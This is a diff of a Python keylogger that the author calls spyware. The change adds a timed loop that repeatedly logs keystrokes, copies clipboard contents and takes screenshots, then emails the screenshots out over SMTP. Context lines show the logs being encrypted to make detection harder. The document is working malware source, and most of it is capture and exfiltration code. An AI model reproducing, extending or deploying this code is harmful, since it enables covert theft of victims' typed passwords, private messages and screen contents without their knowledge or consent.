@@ -1,98 +1,45 @@
-# I still need to put in a way to add iterations to parts of the spyware so it repeats certain steps
-
 from email import encoders
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 import smtplib
-
 import socket
 import platform
-
 import win32clipboard
-
 from pynput.keyboard import Key, Listener
-
 import time
 import os
-
 from cryptography.fernet import Fernet
-
-import getpass
 from requests import get
-
-from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
-
-
 # Declaring important variables for data storage
-keys_info = "keysInfo.txt"
+keys_info = "key_log.txt"
 system_info = "system_info.txt"
 clipboard_info = "clipboard.txt"
 screenshot_info = "screenshot.png"
 
+# Variables for encryptyed data storage
 keys_info_e = "e_key_log.txt"
 system_info_e = "e_system_info.txt"
 clipboard_info_e = "e_clipboard.txt"
 
+# Amount of seconds for the iteration timer to wait before moving to the next iteration
+time_iteration = 1800
+num_iterations_end = 4
+
 # Email account the information will be sent to
-emailAddress = " "   # Email account the script will use to send
-password = " "       # Password for the emailAddress
-toAddress = " "      # Email account that the log files will be sent to
+emailAddress = ""
+password = ""
+toAddress = ""
 
-username = getpass.getuser()
-
-crypt_key = str(" ") # the encryption key
+# The encryption key
+crypt_key = str("")
 
 # File path the data variables will be stored into
-file_path = " "      # Path to save log files to
+file_path = ""
 extend = "\\"
 file_merge = file_path + extend
-
-# Creating an array to hold keys, and starting a counter to reset key presses.
-keys = []
-count = 0
-
-
-
-
-# Main Keylogging Module
-def on_press(key):
-    global keys, count
-
-    print(key)
-    keys.append(key)
-    count += 1
-
-    if count >= 1:
-        count = 0
-        write_file(keys)
-        keys = []
-
-
-# Writes the files to the log and cleans up the output
-def write_file(key):
-    with open(file_path + extend + keys_info, "a") as f:
-        for key in key:
-            k = str(key).replace("'", "")
-            if k.find("space") > 0:
-                f.write('\n')
-                f.close()
-            elif k.find("Key") == -1:
-                f.write(k)
-                f.close()
-
-
-# Ads a kill switch as pressing "esc"
-def on_release(key):
-    if key == Key.esc:
-        return False
-
-
-# Starts the listener
-with Listener(on_press=on_press, on_release=on_release) as Listener:
-    Listener.join()
 
 
 # Using MIMEMultipart to automate sending emails, found a couple of great guides on tihs
@@ -147,7 +94,7 @@ def copy_clipboard():
             pastedData = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
 
-            f.write("Clipboard Data: \n" + pastedData + '\n')
+            f.write("\nClipboard Data: \n" + pastedData + '\n')
 
         except:
             f.write("Could not copy clipboard")
@@ -165,8 +112,57 @@ copy_clipboard()
 computer_info()
 
 screenshot()
-send_email(screenshot_info, file_path + extend + screenshot_info, toAddress)
 
+# This took a while to get working
+num_iterations = 0  # keeps track of how many interations run
+currentTime = time.time()  # tracks the time
+stoppingTime = time.time() + time_iteration  # tracks the stopping time
+
+while num_iterations < num_iterations_end:  # while statement for the iterations
+    count = 0
+    keys = []
+
+
+    def on_press(key):  # the same keylogger code from previous version
+        global keys, count, currentTime
+        print(key)
+        keys.append(key)
+        count += 1
+        currentTime = time.time()
+        if count >= 1:
+            count = 0
+            write_file(keys)
+            keys = []
+
+
+    def write_file(key):
+        with open(file_path + extend + keys_info, "a") as f:
+            for key in key:
+                k = str(key).replace("'", "")
+                if k.find("space") > 0:
+                    f.write('\n')
+                    f.close()
+                elif k.find("Key") == -1:
+                    f.write(k)
+                    f.close()
+
+
+    def on_release(key):
+        if currentTime > stoppingTime:  # checks the timer when a key is released
+            return False
+
+
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+    if currentTime > stoppingTime:  # takes and emails a screenshot each iteration
+        screenshot()
+        send_email(screenshot_info, file_path + extend + screenshot_info, toAddress)
+        copy_clipboard()
+        num_iterations += 1
+
+        currentTime = time.time()
+        stoppingTime = time.time() + time_iteration
 
 # Encrypts the text files the keylogger saves from the given key, making it harder to detect
 files_encrypt = [file_merge + system_info, file_merge + clipboard_info, file_merge + keys_info]
